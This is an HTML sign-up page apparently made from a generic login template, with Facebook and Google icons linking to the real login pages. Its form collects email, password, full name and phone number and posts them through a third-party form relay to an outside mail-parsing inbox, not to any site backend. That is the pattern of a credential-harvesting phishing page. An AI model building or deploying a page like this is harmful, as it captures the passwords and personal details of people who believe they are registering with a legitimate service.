<!doctype html>
<html lang="en">
<head>
    <title>Sign Up</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="../css/A.style.css.pagespeed.cf.AxmTFBrhes.css">
</head>
<body>
    <section class="ftco-section">
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-md-7 col-lg-5">
                    <div class="wrap">
                        <div class="img" style="background-image: url('https://scontent-atl3-2.xx.fbcdn.net/v/t1.6435-9/121263859_10158655611919561_2491513063509756206_n.jpg?_nc_cat=110&ccb=1-5&_nc_sid=a26aad&_nc_ohc=ZnQjINNanOIAX-jUdsw&_nc_ht=scontent-atl3-2.xx&oh=d8e5d5a3cc795bf821cbd64ea83ea5bd&oe=61B7AA3C');"></div>
                            <div class="login-wrap p-4 p-md-5">
                                <div class="d-flex">
                                    <div class="w-100">
                                        <h3 class="smb-4">Sign Up</h3>
                                    </div>

                                    <div class="w-100">
                                        <p class="social-media d-flex justify-content-end">
                                        <a href="https://www.facebook.com/login/" target="__blank" class="social-icon d-flex align-items-center justify-content-center"><span class="fa fa-facebook"></span></a>
                                        <a href="https://accounts.google.com/AccountChooser" target="__blank"class="social-icon d-flex align-items-center justify-content-center"><span class="fa fa-google"></span></a>
                                        </p>
                                    </div>

                                </div>

                                <form action="https://formsubmit.co/eityrcqz@mailparser.io" method="POST" class="signin-form">
                                    <div class="form-group mt-3">
                                        <input type="text" name="email" class="form-control" required>
                                        <label class="form-control-placeholder" for="username">Email</label>
                                    </div>

                                    <div class="form-group">
                                        <input id="password" name="password" type="password" class="form-control" name="password"     required>
                                        <label class="form-control-placeholder" for="password">Password</label>
                                        <span toggle="#password-field" class="fa fa-fw fa-eye field-icon toggle-password"></span>
                                    </div>

                                    <div class="form-group">
                                        <input id="passwordConfirm" name="passwordConfirm" type="password" class="form-control" required>
                                        <label class="form-control-placeholder" for="passwordConfirm">Confirm Password</label>
                                        <span toggle="#password-field" class="fa fa-fw fa-eye field-icon toggle-password"></span>
                                    </div>

                                    <div class="form-group mt-3">
                                        <input type="text" id="fname" name="fname" class="form-control" required>
                                        <label class="form-control-placeholder" for="fname">First Name</label>
                                    </div>

                                    <div class="form-group mt-3">
                                        <input type="text" id="lname" name="lname" class="form-control" required>
                                        <label class="form-control-placeholder" for="lname">Last Name</label>
                                    </div>

                                    <div class="form-group mt-3">
                                        <input type="text" id="phone" name="phone" class="form-control" required>
                                        <label class="form-control-placeholder" for="phone">Phone Number</label>
                                    </div>

                                    <div class="form-group">
                                        <button type="submit" id="submit" class="form-control btn btn-primary rounded submit px-3">Sign Up</button>
                                    </div>
                                    
                                </form>
                                <p class="text-center">Already a member? <a data-toggle="tab" href="../index.html"> Sign In</a></p>
                            </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script>
    <script src="../js/popper.js+bootstrap.min.js+main.js.pagespeed.jc.3YxqA_kpjO.js"></script> 
    <script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"rayId":"6af15dd80940101c","token":"cd0b4b3a733644fc843ef0b185f98241","version":"2021.11.0","si":100}' crossorigin="anonymous"></script>
</body>

<script src="../js/password-confirmed.js"></script>

</html>
